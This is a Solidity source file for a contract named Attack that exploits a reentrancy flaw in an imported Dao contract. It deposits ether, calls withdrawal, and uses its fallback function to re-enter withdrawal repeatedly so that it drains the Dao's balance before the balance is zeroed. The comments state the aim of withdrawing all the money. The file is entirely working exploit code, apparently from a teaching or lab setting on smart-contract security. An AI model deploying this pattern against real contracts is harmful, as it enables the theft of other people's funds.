// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Dao.sol";

contract Attack {
    Dao dao;

    constructor(address _daoAddr) {
        dao = Dao(_daoAddr);
    }

    function attack() external payable {
        dao.deposit{value: msg.value}();
        dao.withdrawal();
    }

    // fallback func will accept reentrancy contract's sending ether
    // and before update balance to zero, below code will reenter and withdraw all of money
    fallback() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.withdrawal();
        }
    }
}
